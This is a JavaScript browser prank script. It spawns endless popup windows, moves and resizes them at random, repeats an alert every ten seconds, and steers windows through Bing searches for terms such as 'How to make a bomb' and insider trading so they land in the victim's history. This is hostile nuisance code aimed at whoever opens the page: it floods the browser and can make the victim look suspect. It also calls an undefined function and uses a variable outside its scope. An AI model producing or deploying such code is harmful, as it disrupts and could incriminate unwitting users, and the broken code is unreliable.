var windowCount = 0;
const SEARCHES = [
    'Huntsman spider',
    'Snapewives',
    'Pressure cooker bombs',
    'backpacks',
    'Botfly removal',
    'How to make a bomb',
    'Mouth larva',
    'Insider trading in an international account',
    'Bedbugs',
    'Everything Facebook knows about you',
    'Calculus bridge'
  ]

function onCloseWindow (win) {
  setTimeout(() => {
    const { x, y } = getRandomCoords()
    win.resizeTo(Math.floor(Math.random() * screen.width), Math.floor(Math.random() * screen.height));
    win.moveTo(x, y);
    setupSearchWindow(win)
  }, 1000)
}

function createWindow() {
  var newWindow = window.open("", "window" + windowCount, "width=200,height=200,resizable=yes,scrollbars=yes");
  newWindow.document.write("<p>Uh ohhhh.... It looks like you messed up... >:)" + windowCount + "</p>");
  moveWindow(newWindow);
  windowCount++;
  setTimeout(createWindow, 200);
}

function moveWindow(win) {
  var x = Math.floor(Math.random() * screen.width);
  var y = Math.floor(Math.random() * screen.height);
  win.resizeTo(Math.floor(Math.random() * screen.width), Math.floor(Math.random() * screen.height));
  win.moveTo(x, y);
  setTimeout(function() { moveWindow(win); }, 200);
}

function setupSearchWindow (win) {
    if (!win) return
    win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
    let searchIndex = 1
    const interval = setInterval(() => {
      if (searchIndex >= SEARCHES.length) {
        clearInterval(interval)
        win.window.location = window.location.pathname
        return
      }
  
      if (win.closed) {
        clearInterval(interval)
        onCloseWindow(win)
        return
      }
  
      win.window.location = window.location.pathname
      setTimeout(() => {
        const { x, y } = getRandomCoords()
        win.resizeTo(Math.floor(Math.random() * screen.width), Math.floor(Math.random() * screen.height));
        win.moveTo(x, y);
        win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
        searchIndex++
      }, Math.floor(Math.random() * 5000))
    }, Math.floor(Math.random() * 5000))
}

createWindow();
setupSearchWindow(newWindow);

setInterval(function(){
  alert("Hey, Are you still there?");
}, 10000);